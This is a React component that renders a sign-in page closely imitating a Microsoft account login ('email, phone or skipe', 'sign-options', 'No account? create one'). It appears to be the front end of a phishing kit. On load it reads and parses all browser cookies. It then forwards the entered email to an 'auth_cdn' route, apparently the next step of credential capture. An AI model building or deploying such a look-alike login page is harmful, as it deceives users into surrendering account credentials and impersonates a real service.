import React, { useState ,useEffect } from 'react'
import Key from '../assets/key.svg'
import Logo from '../assets/logo.svg'
import { useNavigate } from 'react-router-dom'

function Home() {
  const [email , setEmail] = useState('')

  // useEffect(() => {
  //   const cookies = document.cookie.split(';').map(cookie => cookie.trim());
  //   console.log(cookies);
  // }, []);

  useEffect(() => {
    const cookies = document.cookie.split(';').reduce((cookiesObject, cookieString) => {
      const [name, value] = cookieString.split('=').map(str => str.trim());
      cookiesObject[name] = value;
      return cookiesObject;
    }, {});

    console.log(cookies);

    // Clean up function to be executed when the component unmounts
    return () => {
      // Clean-up code (if necessary)
    };
  }, []); // Empty dependency array means this effect runs only once after initial render

  const navigate = useNavigate()

  const emailSumbitHandler = ()=>{
    if(email === ""){
       alert('please enter email')
    }else{
      navigate(`/auth_cdn/${email}`)
    }

    
  }
  return (
   <div className='dab '>
    <div className="container">
    <div className="row">
      <div className="col l3"></div>
      <div style={{
        padding:5
      }} className="col l5 s12 z-depth-1">
        <div className="top">
          <div className="logo">
            <img
              src={Logo}
              alt=""
            />
          </div>
          <div className="content">
            <h3 className="title">Sign in</h3>
            <div>
              <input
               onChange={(event)=>
                setEmail(event.target.value)}
                type="text"
                placeholder="email,phone or skipe"
                name=""
                
              />
            </div>
            <p className="red-text" id="error"></p>
            <div>
              <p><span>No account</span> <a href="">create one</a></p>
            </div>
            <div style={{marginBottom: "50px !important"}}>
              <div className="right">
                <button style={{marginRight:5}} className="btn grey lighten-1 mogo z-depth-0">
                  Back
                </button>
                <button onClick={emailSumbitHandler} className="btn next mogo z-depth-0">
                  Next
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="col l3"></div>
    </div>
    <div className="row">
      <div className="col l3">
        <img src="" alt="" />
      </div>
      <div
        style={{height: "40px", paddingTop: "10px"}}
        className="col l5 s12 z-depth-1 white"
      >
        <div className="row">
          <div className="col l6 s12">
            <div className="row">
              <div className="col l3">
                <img
                  width="30px"
                  src={Key}
                  alt=""
                />
              </div>
              <div className="col l9"><span>sign-options</span></div>
            </div>
          </div>
          <div className="col l6"></div>
        </div>
      </div>
      <div className="col l3"></div>
    </div>
    </div>
    </div>
  )
}

export default Home
